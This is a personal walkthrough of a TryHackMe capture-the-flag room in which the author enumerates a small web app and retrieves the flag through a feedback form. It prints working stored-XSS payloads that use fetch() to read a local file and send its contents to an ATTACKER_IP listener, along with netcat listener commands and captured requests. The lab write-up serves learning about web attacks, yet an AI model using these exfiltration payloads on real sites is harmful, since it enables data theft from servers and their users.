This is a TryHackMe CTF room. 
"Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!"

## Enumeration 
started VM with the IP `http://10.10.27.75:8080`. the goal is to get the flag at `http://TARGET_IP:8080/flag.txt`
Started GoBuster using the medium dir list.
```
gobuster dir -u http://10.10.27.75:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.27.75:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/view_feedback        (Status: 401) [Size: 25]
Progress: 220560 / 220561 (100.00%)
```
then scanned all ports on the target machine.
```
sudo nmap -sS -sV -T5 -vv 10.10.27.75 -allports

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy syn-ack ttl 61 Werkzeug/3.0.1 Python/3.8.10
```
I then cURL'd the target to review the code and found a submit feedback link.
```
<header>
        <ul>
            <li><a href="/">Home</a></li>
            <li><a href="/submit_feedback">Feedback</a></li>
        </ul>
    </header>
```
Further investigating reveals that the submit uses a POST method; potential entry point. I tried to go straight to the flag.txt and get a "401 Unauthorized"

Going straight to /submit_feedback shows:
![screenshot][Pasted image 20241229221603.png]
So this shows me that I can potentially exploit the text input.

## Exploring potentials
so there are a couple train of thoughts I considered looking for using BurpSuite and DevTools.
* session cookies
* weird headers
* hidden directories

There are no session cookies or weird headers that stick out to me. However I did discover a /view_feedback directory.  This turned out to be behind a 401 unauthorized response, I don't feel this is relevant.

I tried to validate XSS by submitting a basic script tag to alert XSS. This did not prove to work and sent me down a couple other methods of exploitation that were not promising. I used python to create a couple scripts to group and automate some of these tasks, including:
* Cross-Site Request Forgery (CSRF)
* Insecure Direct Object References (IDOR)
* Local File Inclusion (LFI) or Remote File Inclusion (RFI)
* Reflective File Access
None of these seemed to bare fruit and I started to feel XSS was the answer and started researching potential payloads since the delivery method has to be the text input.

# XSS Exploitation
I determined that XSS had to be the exploit to get the flag, but how? I researched some payloads, I kept getting some basic ones that did not work, I didn't find them though I am sure they exist and I admit I didn't look to hard. I found a write-up on this specific box with the answer obfuscated and skimmed it. 

I would have never got this without help. the payload seems more complicated than I would have been able to write or even find. So the test payload looks like this:

```
<img src=x onerror="fetch('http://ATTACKER_IP:PORT')"/>
```

The payload works as a basic XSS attack. what happens is:
* `<img/>` tag is inserted with the source of x(`src="x"`). Because the source is invalid you need an `onerror` event
* `"fetch()"`: is used to call API's I believe. in this case we are going to insert our attacking ip(`'http://ATTACKER_IP:PORT'`) 
* `PORT`: the port you assign in a netcat listener

This needs to be submitted in the text input once you have a netcat listener setup on a specified port, I used:

```
nc -knvlp 8000
listening on [any] 8000 ...
```

Once listening you can submit the above payload. it will take a second or two to receive a response:

```
nc -knvlp 8000
listening on [any] 8000 ...
connect to [THM_VPN_IP] from (UNKNOWN) [10.10.27.75] 56902
GET / HTTP/1.1
Host: THM_VPN_IP:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```

This proves XSS can be achieved. the payload to now get the flag is:

```
<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://ATTACKER_IP:PORT/?c=' + r)).catch(e => fetch('http://ATTACKER_IP:PORT/?c=' + e))"/>
```

Okay so lets break this down before submitting, first I had to initiate another listener before submitting. This payload can be parsed as such:
* `"fetch('127.0.0.1:8080/flag.txt')`: This makes a request to the local server of the Target_Machine and 127.0.0.1 is the loopback address. If the flag is stored in a file, this attempts to retrieve its contents.
* `.then(r => r.text())`: If the content in the flag is fetched, the `.text()` method extracts the contents as text.
* `.then(r => fetch('http://ATTACKER_IP:PORT/?c=' + r))`: This section sends the contents to your listener by appending the contents of the flag as a query parameter (`?c=<flag content>`).
* `.catch(e => fetch('http://ATTACKER_IP:PORT/?c=' + e))"`: This catches any errors if for any reason the request to the flag fails. `catch` sends any errors to the attacker, using the (`?c=<error message>`) again.

So with your listener back up and running, submit the final payload. You should see:

```
nc -knvlp 8000
listening on [any] 8000 ...
connect to [THM_VPN_IP] from (UNKNOWN) [10.10.27.75] 45532
GET /?c=THM{█████████████████████████████████████████} HTTP/1.1
Host: THM_VPN_IP:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gec HeadlessChrome/119.0.6045.105 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```

# Summary

* XSS was the vector of exploitation due to the application allowing a user to inject and execute arbitrary JavaScript in the browser.
* I leveraged JavaScript's `fetch()` method to access the flag located on the victims local server and exfil the contents.
* The payload executed successfully due to the lack of input sanitization or proper output encoding by the application, if these measures were in place this would not be an attack vector.

# Conclusion
I did not write or create the payload but after further research I can see how it was put together. Huge shoutout to Jay Bhatt's medium post that provided the payload and a much more concise walkthrough of The Sticker Store box on THM. I personally thought I could exploit a different way and narrowed down to XSS. I worked through my own process till I hit a wall and sought assistance.

Tools used:
* GoBuster
* Nmap
* Burpsuite
* cURL
* NetCat
* Python3
